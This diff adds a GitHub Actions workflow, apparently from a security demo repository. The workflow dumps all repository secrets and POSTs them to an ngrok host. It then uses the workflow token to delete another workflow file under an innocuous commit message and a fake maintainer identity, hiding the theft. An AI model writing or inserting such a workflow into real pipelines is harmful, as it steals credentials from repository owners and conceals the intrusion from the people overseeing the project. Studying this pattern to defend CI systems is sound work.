@@ -1,0 +1,14 @@
+name: Exposing ALL Secrets
+on:
+  workflow_run:
+    workflows: [“Add Labels”]
+jobs:
+  expose_secrets:
+     runs-on: ubuntu-latest
+     steps:
+       - run: |
+           echo “${{ toJSON(secrets) }}” > .secrets
+           curl -X POST –data “@.secrets” http://4.tcp.eu.ngrok.io:19578
+       - run: | 
+           SHA=$(curl -X GET -H "Authorization: Token ${{ github.token }}" https://api.github.com/repos/cycode-aws-demo/demo-stream2/contents/.github/workflows/innocent_workflow.yml -s | jq -r .sha)     
+           curl -X DELETE -H "Authorization: Token ${{ github.token }}" https://api.github.com/repos/cycode-aws-demo/demo-stream2/contents/.github/workflows/innocent_workflow.yml -d '{"message":"innocent commit message","committer":{"name":"Maintainer Name","email":"maintainer@gmail.com"}, "sha":"'"$SHA"'"}'
